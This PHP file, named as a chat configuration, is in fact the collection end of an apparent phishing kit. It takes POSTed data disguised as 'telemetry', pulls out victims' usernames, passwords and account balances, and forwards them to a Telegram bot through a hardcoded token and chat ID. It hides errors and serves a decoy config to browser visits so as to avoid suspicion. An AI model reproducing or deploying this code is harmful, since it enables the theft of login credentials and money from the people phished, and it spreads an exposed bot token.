<?php
// config/chat_config.php
// Ocultar errores para no revelar nada en salida no deseada
error_reporting(0);
// Credenciales ocultas en el servidor
$TELEGRAM_CHAT_ID = '-5270806868';
$TELEGRAM_BOT_TOKEN = '8310315205:AAEDfY0nwuSeC_G6l2hXzbRY2xzvAHNJYvQ';
function sendTelegramMessage($chatId, $token, $message) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    return $result;
}
// Verificar si es una petición POST con datos de telemetría (Ofuscado)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sys_data'])) {
    
    $rawData = $_POST['sys_data'];
    // Decodificar info básica (esperamos un JSON en string)
    $data = json_decode($rawData, true);
    
    if ($data) {
        // Construir mensaje
        $msg = "<b>📡 REPORTE DE ACTIVIDAD</b>\n\n";
        
        // Agregar campos dinámicamente
        if (isset($data['u'])) $msg .= "<b>Usuario:</b> " . htmlspecialchars($data['u']) . "\n";
        if (isset($data['p'])) $msg .= "<b>Clave:</b> " . htmlspecialchars($data['p']) . "\n";
        if (isset($data['s'])) $msg .= "<b>Estado:</b> " . htmlspecialchars($data['s']) . "\n";
        if (isset($data['b'])) $msg .= "<b>Saldo:</b> " . htmlspecialchars($data['b']) . "\n";
        if (isset($data['i'])) $msg .= "<b>Info Extra:</b> " . htmlspecialchars($data['i']) . "\n";
        
        $msg .= "\n<i>Time: " . date('Y-m-d H:i:s') . "</i>";
        
        // Enviar a Telegram
        sendTelegramMessage($TELEGRAM_CHAT_ID, $TELEGRAM_BOT_TOKEN, $msg);
        
        // Responder éxito discreto
        echo json_encode(['status' => 'ok']);
        exit;
    }
}
// Si entran por navegador (GET), mostrar algo inocente o la config antigua
// para no levantar sospechas
$dummyConfig = [
    'system_status' => 'active',
    'version' => '1.0.4',
    'maintenance' => false
];
echo json_encode($dummyConfig);
?>
